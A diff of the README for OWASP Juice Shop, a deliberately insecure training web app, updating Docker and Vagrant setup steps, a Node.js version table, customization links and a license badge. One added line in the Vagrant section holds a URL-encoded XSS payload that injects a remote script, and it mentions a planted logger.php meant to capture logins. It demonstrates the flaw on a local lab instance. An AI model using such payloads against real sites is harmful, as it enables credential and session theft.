@@ -51,8 +51,9 @@ overview please visit the official project page:
 1. Install [Docker](https://www.docker.com)
 2. Run `docker pull bkimminich/juice-shop`
 3. Run `docker run -d -p 3000:3000 bkimminich/juice-shop`
-4. Browse to <http://localhost:3000> (on macOS browse to
-   <http://192.168.99.100:3000> instead)
+4. Browse to <http://localhost:3000> (on macOS and Windows browse to
+   <http://192.168.99.100:3000> if you are using docker-machine instead
+   of the native docker installation )
 
 #### Even easier: Run Docker Container from Docker Toolbox (Kitematic)
 
@@ -107,7 +108,9 @@ docker run -d -p 80:3000 bkimminich/juice-shop
    clone [your own fork](https://github.com/bkimminich/juice-shop/fork)
    of the repository)
 3. Run `cd vagrant && vagrant up`
-4. Browse to <http://juice.sh>
+4. Browse to [192.168.33.10](http://192.168.33.10)
+
+>To show the impact of XSS, you can open [Evil JavaScript Link](http://192.168.33.10/#/search?q=%3Cscript%3Evar%20js%20%3Ddocument.createElement%28%22script%22%29;js.type%20%3D%20%22text%2Fjavascript%22;js.src%3D%22http:%2F%2F192.168.33.10%2Fshake.js%22;document.body.appendChild%28js%29;varhash%3Dwindow.location.hash;window.location.hash%3Dhash.substr%280,8%29;%3C%2Fscript%3Eapple) and login. The evil guy installed also a [Logger](http://192.168.33.10/logger.php).
 
 ## Node.js version compatibility
 
@@ -115,11 +118,11 @@ OWASP Juice Shop officially supports the following versions of
 [node.js](http://nodejs.org) and offers Docker images and packaged
 distributions accordingly:
 
-| node.js | [Docker images](https://registry.hub.docker.com/u/bkimminich/juice-shop) | Docker snapshots                                         | [Packaged distributions](https://github.com/bkimminich/juice-shop/releases/latest)       |
-|:--------|:-------------------------------------------------------------------------|:---------------------------------------------------------|:-----------------------------------------------------------------------------------------|
-| 4.x     | `node4`                                                                  | `node4-snapshot`, `node4-develop`                        | `juice-shop-<version>_node4_windows_x64.zip`, `juice-shop-<version>_node4_linux_x64.tgz` |
-| __6.x__ | __`latest`__, `node6`                                                    | `snapshot`, `develop`, `node6-snapshot`, `node6-develop` | `juice-shop-<version>_node6_windows_x64.zip`, `juice-shop-<version>_node6_linux_x64.tgz` |
-| 7.x     | `node7`                                                                  | `node7-snapshot`, `node7-develop`                        | `juice-shop-<version>_node7_windows_x64.zip`, `juice-shop-<version>_node7_linux_x64.tgz` |
+| node.js | [Docker images](https://registry.hub.docker.com/u/bkimminich/juice-shop) (from `master`) | Docker snapshots (from `develop`) | [Packaged distributions](https://github.com/bkimminich/juice-shop/releases/latest)       |
+|:--------|:-----------------------------------------------------------------------------------------|:----------------------------------|:-----------------------------------------------------------------------------------------|
+| 4.x     | `node4`                                                                                  | `node4-snapshot`                  | `juice-shop-<version>_node4_windows_x64.zip`, `juice-shop-<version>_node4_linux_x64.tgz` |
+| __6.x__ | __`latest`__, `node6`                                                                    | `snapshot`, `node6-snapshot`      | `juice-shop-<version>_node6_windows_x64.zip`, `juice-shop-<version>_node6_linux_x64.tgz` |
+| 8.x     | `node8`                                                                                  | `node8-snapshot`                  | `juice-shop-<version>_node8_windows_x64.zip`, `juice-shop-<version>_node8_linux_x64.tgz` |
 
 > The stable Docker images are built from `master` while the snapshot
 > images are built from `develop` branch. The latter contain unreleased
@@ -137,9 +140,12 @@ Feel free to have a look at the latest version of OWASP Juice Shop:
 ## Customization
 
 Via a YAML configuration file in `/config`, the OWASP Juice Shop can be
-customized in its content and look & feel. Please refer to
-[CUSTOMIZATION.md](CUSTOMIZATION.md) for detailed instructions and
-examples.
+customized in its content and look & feel. For detailed instructions and
+examples please refer to
+[the "Customization" chapter of our companion guide ebook](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/customization.html).
+
+> Kudos for envisioning and original implementation of this feature go
+> to [@wurstbrot](https://github.com/wurstbrot)!
 
 ## CTF-Extension
 
@@ -268,7 +274,7 @@ Ordered by date of first contribution.
 - [ninoseki](https://github.com/ninoseki)
 - [Jannik Hollenbach](https://github.com/J12934) aka `J12934`
 
-## Licensing [![license](https://img.shields.io/github/license/bkimminich/juice-shop.svg)](LICENSE)
+## Licensing [![license](https://img.shields.io/github/license/bkimminich/juice-shop.svg)](LICENSE) [![FOSSA Status](https://app.fossa.io/api/projects/git%2Bhttps%3A%2F%2Fgithub.com%2Fbkimminich%2Fjuice-shop.svg?type=shield)](https://app.fossa.io/projects/git%2Bhttps%3A%2F%2Fgithub.com%2Fbkimminich%2Fjuice-shop?ref=badge_shield)
 
 This program is free software: you can redistribute it and/or modify it
 under the terms of the [MIT license](LICENSE). OWASP Juice Shop and any
